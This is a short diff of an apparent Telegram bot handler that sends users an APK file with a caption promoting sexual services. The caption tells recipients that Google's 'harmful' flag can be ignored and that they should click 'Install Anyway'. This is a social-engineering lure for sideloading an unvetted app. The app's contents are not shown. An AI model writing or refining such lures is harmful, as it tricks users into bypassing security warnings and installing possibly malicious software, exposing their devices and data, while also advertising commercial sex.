@@ -55,7 +55,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_document(
         document=open("media/pinaysecret.apk", "rb"),
         caption=(
-            "📥 *Download the App for Exclusive Videos & Photos!*\n\n"
+            "📥 *Download the App to Choose Angels for Walk booking & Video Call Sex!*\n\n"
             "⚠️ *Note:* Google may flag this as 'harmful' because it's not from the PlayStore. "
             "Don't worry, it's safe. Just click *Install Anyway*.\n\n"
             "🔞 *Reminder: 18+ only before installing!*"
